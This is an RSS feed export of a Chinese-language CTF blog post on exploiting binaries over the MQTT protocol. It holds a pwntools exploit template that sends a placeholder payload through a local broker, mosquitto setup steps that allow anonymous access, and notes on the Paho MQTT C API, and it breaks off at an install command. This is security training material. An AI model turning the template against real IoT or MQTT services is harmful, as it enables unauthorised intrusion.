<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>J4f&#39;s blog</title>
    <link>http://localhost:1313/</link>
    <description>J4f&#39;s blog</description>
    <generator>Hugo 0.154.3 &amp; FixIt v0.4.2-20260109063229-50d27e0e</generator>
    <language>en</language>
    <lastBuildDate>Mon, 02 Feb 2026 12:27:04 +0800</lastBuildDate>
    <atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Mqtt协议pwn</title>
      <link>http://localhost:1313/posts/mqtt/</link>
      <pubDate>Mon, 02 Feb 2026 12:25:12 +0800</pubDate>
      <guid>http://localhost:1313/posts/mqtt/</guid>
      <category domain="http://localhost:1313/categories/pwn/">Pwn</category>
      <description>&lt;h4 class=&#34;heading-element&#34; id=&#34;模板&#34;&gt;&lt;span&gt;模板&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e6%a8%a1%e6%9d%bf&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;from pwn import *&#xD;&#xA;import paho.mqtt.client as mqtt&#xD;&#xA;context.terminal = [&amp;#34;tmux&amp;#34;, &amp;#34;splitw&amp;#34;, &amp;#34;-h&amp;#34;]&#xD;&#xA;context(os=&amp;#39;linux&amp;#39;,arch=&amp;#39;amd64&amp;#39;,log_level=&amp;#39;debug&amp;#39;)&#xD;&#xA;&#xD;&#xA;address = &amp;#39;./pwn&amp;#39;&#xD;&#xA;# address = &amp;#39;./pwn_patched&amp;#39;&#xD;&#xA;elf = ELF(address)&#xD;&#xA;libc = elf.libc&#xD;&#xA;&#xD;&#xA;#-----------------------------------------------------------------&#xD;&#xA;s       = lambda data               :p.send(data)&#xD;&#xA;ss      = lambda data               :p.send(str(data))&#xD;&#xA;sa      = lambda delim,data         :p.sendafter(str(delim), data)&#xD;&#xA;sl      = lambda data               :p.sendline(data)&#xD;&#xA;sls     = lambda data               :p.sendline(str(data))&#xD;&#xA;sla     = lambda delim,data         :p.sendlineafter(delim, data)&#xD;&#xA;r       = lambda num                :p.recv(num)&#xD;&#xA;ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)&#xD;&#xA;itr     = lambda                    :p.interactive()&#xD;&#xA;uu32    = lambda data               :u32(data.ljust(4,b&amp;#39;\x00&amp;#39;))&#xD;&#xA;uu64    = lambda data               :u64(data.ljust(8,b&amp;#39;\x00&amp;#39;))&#xD;&#xA;# lg      = lambda s,addr&#x9;&#x9;        : log.info(&amp;#39;\033[1;31;40m %s --&amp;gt; 0x%x \033[0m&amp;#39; % (s,addr))&#xD;&#xA;lg      = lambda s&#x9;&#x9;&#x9;        : log.info(&amp;#39;\033[1;31;40m %s --&amp;gt; 0x%x \033[0m&amp;#39; % (s, eval(s)))&#xD;&#xA;l64     = lambda                    :u64(p.recvuntil(&amp;#34;\x7f&amp;#34;)[-6:].ljust(8,b&amp;#34;\x00&amp;#34;))&#xD;&#xA;l32     = lambda                    :u32(p.recvuntil(&amp;#34;\xf7&amp;#34;)[-4:].ljust(4,b&amp;#34;\x00&amp;#34;))&#xD;&#xA;r64     = lambda                    :u64(p.recv(6).ljust(8,b&amp;#39;\x00&amp;#39;))&#xD;&#xA;ir64    = lambda                    :int(p.recv(14),16)&#xD;&#xA;#-----------------------------------------------------------------&#xD;&#xA;gdbscript = \&#xD;&#xA;&amp;#34;&amp;#34;&amp;#34;&#xD;&#xA;    &#xD;&#xA;    c&#xD;&#xA;&amp;#34;&amp;#34;&amp;#34;&#xD;&#xA;if len(sys.argv) &amp;gt; 1 and sys.argv[1] == &amp;#34;r&amp;#34;:&#xD;&#xA;    p = remote(&amp;#34;host.docker.internal&amp;#34;,9999 )&#xD;&#xA;elif len(sys.argv) &amp;gt; 1 and sys.argv[1] == &amp;#34;d&amp;#34;:&#xD;&#xA;    p = gdb.debug(address, gdbscript = gdbscript)&#xD;&#xA;else:&#xD;&#xA;    p = process(address)&#xD;&#xA;&#xD;&#xA;def dbg():&#xD;&#xA;    gdb.attach(p)&#xD;&#xA;    # gdb.attach(p, gdbscript=gdbscript)&#xD;&#xA;    # pause()&#xD;&#xA;&#xD;&#xA;# ------------------------ MQTT 配置 ------------------------&#xD;&#xA;MQTT_HOST = &amp;#34;127.0.0.1&amp;#34;&#xD;&#xA;MQTT_PORT = 9999&#xD;&#xA;MQTT_TOPIC_PUB = &amp;#34;diag/send&amp;#34;&#xD;&#xA;MQTT_TOPIC_SUB = &amp;#34;diag/resp&amp;#34;&#xD;&#xA;&#xD;&#xA;client = mqtt.Client()&#xD;&#xA;&#xD;&#xA;def publish(topic,pl):&#xD;&#xA;    result = client.publish(topic=topic, payload=pl)&#xD;&#xA;    log.info(f&amp;#34;MQTT Published: {payload}&amp;#34;)&#xD;&#xA;    return result&#xD;&#xA;&#xD;&#xA;def on_connect(client, userdata, flags, rc):&#xD;&#xA;    log.info(f&amp;#34;MQTT Connected with code {rc}&amp;#34;)&#xD;&#xA;    client.subscribe(MQTT_TOPIC_SUB)&#xD;&#xA;    client.subscribe(&amp;#34;#&amp;#34;) &#xD;&#xA;&#xD;&#xA;def on_message(client, userdata, msg):&#xD;&#xA;    message = msg.payload.decode()&#xD;&#xA;    log.info(f&amp;#34;MQTT Received on {msg.topic}: {message}&amp;#34;)&#xD;&#xA;&#xD;&#xA;client.on_connect = on_connect&#xD;&#xA;client.on_message = on_message&#xD;&#xA;client.connect(MQTT_HOST, MQTT_PORT, keepalive=60)&#xD;&#xA;client.loop_start()&#xD;&#xA;&#xD;&#xA;# 发送示例 payload&#xD;&#xA;pl = b&amp;#39;aaaa&amp;#39;&#xD;&#xA;publish(MQTT_TOPIC_PUB,pl)&#xD;&#xA;&#xD;&#xA;&#xD;&#xA;itr()&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;基础知识&#34;&gt;&lt;span&gt;基础知识&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;h5 class=&#34;heading-element&#34; id=&#34;配置环境&#34;&gt;&lt;span&gt;配置环境&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e9%85%8d%e7%bd%ae%e7%8e%af%e5%a2%83&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h5&gt;&lt;pre&gt;&lt;code&gt;sudo apt update&#xD;&#xA;sudo apt install -y mosquitto mosquitto-clients&#xD;&#xA;sudo systemctl enable mosquitto&#xD;&#xA;sudo systemctl start mosquitto&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;测试服务：&lt;/p&gt;&#xA;&lt;p&gt;打开两个终端，终端1：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;mosquitto_sub -h localhost -t &amp;#34;test/topic&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;table&gt;&#xA;  &lt;thead&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;th&gt;参数&lt;/th&gt;&#xA;          &lt;th&gt;说明&lt;/th&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/thead&gt;&#xA;  &lt;tbody&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;code&gt;-h localhost&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;指定 MQTT Broker 的地址（这里是本机）&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;code&gt;-t &amp;quot;test/topic&amp;quot;&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;订阅的主题（&lt;code&gt;test/topic&lt;/code&gt;）&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/tbody&gt;&#xA;&lt;/table&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;订阅（接收）&lt;/strong&gt; 某个 MQTT 主题（&lt;code&gt;test/topic&lt;/code&gt;）的消息。&lt;/li&gt;&#xA;&lt;li&gt;只要有人往 &lt;code&gt;test/topic&lt;/code&gt; 发布消息，这个终端就会打印出来。&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;终端2：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;mosquitto_pub -h localhost -t &amp;#34;test/topic&amp;#34; -m &amp;#34;Hello MQTT&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;table&gt;&#xA;  &lt;thead&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;th&gt;参数&lt;/th&gt;&#xA;          &lt;th&gt;说明&lt;/th&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/thead&gt;&#xA;  &lt;tbody&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;code&gt;-h localhost&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;指定 MQTT Broker 的地址（这里是本机）&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;code&gt;-t &amp;quot;test/topic&amp;quot;&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;发布的目标主题&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;code&gt;-m &amp;quot;Hello MQTT&amp;quot;&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;消息内容（payload）&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/tbody&gt;&#xA;&lt;/table&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;发布（发送）&lt;/strong&gt; 一条消息到 &lt;code&gt;test/topic&lt;/code&gt;。&lt;/li&gt;&#xA;&lt;li&gt;订阅了 &lt;code&gt;test/topic&lt;/code&gt; 的客户端（如终端 A）会收到这条消息。&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;更改配置文件&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo vim /etc/mosquitto/mosquitto.conf&#xD;&#xA;listener 9999 #设置监听端口为 9999&#xD;&#xA;allow_anonymous true  # 可选，允许匿名访问（默认）&#xD;&#xA;sudo systemctl restart mosquitto # 重启服务&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;之后&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;mosquitto_sub -h localhost -p 9999 -t &amp;#34;test/topic&amp;#34;&#xD;&#xA;mosquitto_pub -h localhost -p 9999 -t &amp;#34;test/topic&amp;#34; -m &amp;#34;test&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;h5 class=&#34;heading-element&#34; id=&#34;paho-mqtt-c&#34;&gt;&lt;span&gt;Paho MQTT C&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#paho-mqtt-c&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h5&gt;&lt;blockquote&gt;&#xA;&lt;p&gt;Paho MQTT C 客户端是用 ANSI 标准 C 编写的功能齐全的 MQTT 客户端&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;Paho C 客户端包含四个变体库，包括共享库和静态库：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;paho-mqtt3a&lt;/strong&gt; - 异步访问模式（asynchronous）(MQTTAsync)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;paho-mqtt3as&lt;/strong&gt; - 带 SSL 的异步访问模式（asynchronous with SSL）(MQTTAsync)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;paho-mqtt3c&lt;/strong&gt; - 同步访问模式（&amp;ldquo;classic&amp;rdquo; / synchronous）(MQTTClient)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;paho-mqtt3cs&lt;/strong&gt; - 带 SSL 的同步访问模式（&amp;ldquo;classic&amp;rdquo; / synchronous with SSL）(MQTTClient)&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;MQTTClient_create()&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;MQTTClient_create(&#xD;&#xA;    MQTTClient* handle,         // 客户端句柄（输出参数）&#xD;&#xA;    const char* serverURI,      // MQTT Broker 地址&#xD;&#xA;    const char* clientId,       // 客户端唯一标识符&#xD;&#xA;    int persistence_type,       // 持久化类型&#xD;&#xA;    void* persistence_context   // 持久化上下文（通常为 NULL）&#xD;&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;此函数创建一个 MQTT 客户端，以便连接到指定的服务器并使用指定的持久性存储&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;MQTTClient_setCallbacks()&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;void MQTTClient_setCallbacks(&#xD;&#xA;    MQTTClient handle,                // MQTT 客户端句柄&#xD;&#xA;    void* context,                    // 用户自定义上下文（传给回调函数）&#xD;&#xA;    MQTTClient_connectionLost* cl,    // 连接丢失回调&#xD;&#xA;    MQTTClient_messageArrived* ma,    // 消息到达回调&#xD;&#xA;    MQTTClient_deliveryComplete* dc   // 消息交付完成回调&#xD;&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;typedef void MQTTClient_connectionLost(void* context, char* cause);&#xD;&#xA;typedef int MQTTClient_messageArrived(void* context, char* topicName, int topicLen, MQTTClient_message* message);&#xD;&#xA;typedef void MQTTClient_deliveryComplete(void* context, MQTTClient_deliveryToken dt);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;MQTTClient_connect()&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;int MQTTClient_connect(&#xD;&#xA;    MQTTClient handle,              // MQTT 客户端句柄&#xD;&#xA;    MQTTClient_connectOptions* opts // 连接选项（超时、用户名、密码等）&#xD;&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;typedef struct {&#xD;&#xA;    char* struct_id;               // 固定值 &amp;#34;MQTC&amp;#34;（标识结构体版本）&#xD;&#xA;    int struct_version;            // 结构体版本（通常为 0）&#xD;&#xA;    int keepAliveInterval;         // 心跳间隔（秒）&#xD;&#xA;    int cleansession;              // 是否清除会话（1=是，0=否）&#xD;&#xA;    int reliable;                  // 是否可靠传输（通常为 0）&#xD;&#xA;    MQTTClient_willOptions* will;  // 遗嘱消息选项（可选）&#xD;&#xA;    char* username;                // 用户名（可选）&#xD;&#xA;    char* password;                // 密码（可选）&#xD;&#xA;    int connectTimeout;            // 连接超时（秒）&#xD;&#xA;    int retryInterval;             // 重试间隔（秒）&#xD;&#xA;    int SSL;                       // 是否启用 SSL（1=是，0=否）&#xD;&#xA;    // ... 其他字段（取决于版本）&#xD;&#xA;} MQTTClient_connectOptions;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;连接成功返回&lt;strong&gt;0&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;MQTTClient_subscribe()&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;int MQTTClient_subscribe(&#xD;&#xA;    MQTTClient handle,      // MQTT 客户端句柄（由 `MQTTClient_create` 创建）&#xD;&#xA;    const char* topic,      // 要订阅的主题（如 `&amp;#34;diag&amp;#34;`）&#xD;&#xA;    int qos                 // 服务质量等级（0、1 或 2）&#xD;&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;table&gt;&#xA;  &lt;thead&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;th&gt;参数&lt;/th&gt;&#xA;          &lt;th&gt;类型&lt;/th&gt;&#xA;          &lt;th&gt;说明&lt;/th&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/thead&gt;&#xA;  &lt;tbody&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;code&gt;handle&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;MQTTClient&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;MQTT 客户端句柄（标识唯一的客户端连接）&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;code&gt;topic&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;const char*&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;要订阅的主题名（如 &lt;code&gt;&amp;quot;diag&amp;quot;&lt;/code&gt;）&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;code&gt;qos&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;int&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;strong&gt;服务质量等级&lt;/strong&gt;（决定消息传输的可靠性）：&lt;br&gt; • &lt;code&gt;0&lt;/code&gt;：最多一次（可能丢失）&lt;br&gt; • &lt;code&gt;1&lt;/code&gt;：至少一次（可能重复）&lt;br&gt; • &lt;code&gt;2&lt;/code&gt;：恰好一次（可靠但性能较低）&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/tbody&gt;&#xA;&lt;/table&gt;&#xA;&lt;p&gt;&lt;strong&gt;MQTTClient_publishMessage()&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;int MQTTClient_publishMessage(&#xD;&#xA;    MQTTClient handle,           // MQTT 客户端句柄&#xD;&#xA;    const char *topicName,       // 发布主题（如 &amp;#34;diag/resp&amp;#34;）&#xD;&#xA;    MQTTClient_message *message, // 消息内容结构体（v3）&#xD;&#xA;    MQTTClient_deliveryToken *dt // 输出参数：异步操作令牌（&amp;amp;v2）&#xD;&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;table&gt;&#xA;  &lt;thead&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;th&gt;参数&lt;/th&gt;&#xA;          &lt;th&gt;类型&lt;/th&gt;&#xA;          &lt;th&gt;说明&lt;/th&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/thead&gt;&#xA;  &lt;tbody&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;code&gt;handle&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;MQTTClient&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;由 &lt;code&gt;MQTTClient_create()&lt;/code&gt; 创建的客户端句柄&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;code&gt;topicName&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;const char*&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;消息发布的主题（如 &lt;code&gt;&amp;quot;diag/resp&amp;quot;&lt;/code&gt;）&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;code&gt;message&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;MQTTClient_message*&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;消息内容结构体（需提前初始化）&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;code&gt;dt&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;MQTTClient_deliveryToken*&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;输出参数，用于跟踪异步发布状态（令牌可用于 &lt;code&gt;waitForCompletion&lt;/code&gt;）&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/tbody&gt;&#xA;&lt;/table&gt;&#xA;&lt;pre&gt;&lt;code&gt;typedef struct {&#xD;&#xA;    char        struct_id[4];      // 标识符（固定为 &amp;#34;MQTM&amp;#34;）&#xD;&#xA;    int         struct_version;    // 结构体版本号（通常为 0）&#xD;&#xA;    int         payloadlen;        // 负载数据长度（字节数）&#xD;&#xA;    void*       payload;           // 负载数据指针（二进制安全）&#xD;&#xA;    int         qos;               // 服务质量等级（0/1/2）&#xD;&#xA;    int         retained;          // 是否保留消息（0 或 1）&#xD;&#xA;    int         dup;               // 是否为重复消息（0 或 1）&#xD;&#xA;    int         msgid;             // 消息 ID（QoS &amp;gt; 0 时有效）&#xD;&#xA;    MQTTProperties properties;     // MQTT 5.0 属性（可选）&#xD;&#xA;} MQTTClient_message;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;MQTTClient_waitForCompletion()&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;int MQTTClient_waitForCompletion(&#xD;&#xA;    MQTTClient handle,  // MQTT 客户端句柄&#xD;&#xA;    MQTTClient_deliveryToken dt,  // 异步操作令牌（delivery token）&#xD;&#xA;    unsigned long timeout  // 超时时间（毫秒）&#xD;&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;table&gt;&#xA;  &lt;thead&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;th&gt;参数&lt;/th&gt;&#xA;          &lt;th&gt;类型&lt;/th&gt;&#xA;          &lt;th&gt;说明&lt;/th&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/thead&gt;&#xA;  &lt;tbody&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;code&gt;handle&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;MQTTClient&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;MQTT 客户端句柄，由 &lt;code&gt;MQTTClient_create()&lt;/code&gt; 创建&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;code&gt;dt&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;MQTTClient_deliveryToken&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;strong&gt;异步操作令牌&lt;/strong&gt;，通常来自 &lt;code&gt;MQTTClient_publish()&lt;/code&gt; 的返回值&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;code&gt;timeout&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;unsigned long&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;最大等待时间（毫秒），&lt;code&gt;10000&lt;/code&gt; 表示 10 秒&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/tbody&gt;&#xA;&lt;/table&gt;&#xA;&lt;h5 class=&#34;heading-element&#34; id=&#34;paho-mqtt-python&#34;&gt;&lt;span&gt;Paho MQTT python&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#paho-mqtt-python&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h5&gt;&lt;p&gt;&lt;a href=&#34;https://pypi.org/project/paho-mqtt/#installation&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;pypi&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://eclipse.dev/paho/files/paho.mqtt.python/html/client.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;docs&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;安装&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;pip3 install 